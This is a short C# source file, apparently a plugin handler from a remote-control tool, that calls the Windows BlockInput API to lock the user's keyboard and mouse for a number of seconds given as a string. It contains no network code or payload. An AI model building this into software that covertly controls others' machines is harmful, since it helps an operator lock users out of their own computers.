using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace Plugin.Handler
{
    class HandleBlockInput
    {
        public void Block(string time)
        {
            Native.BlockInput(true);
            try
            {
                Thread.Sleep(TimeSpan.FromSeconds(int.Parse(time)));
            }
            catch
            {
            }
            finally
            {
                Native.BlockInput(false);
            }
        }
    }
}
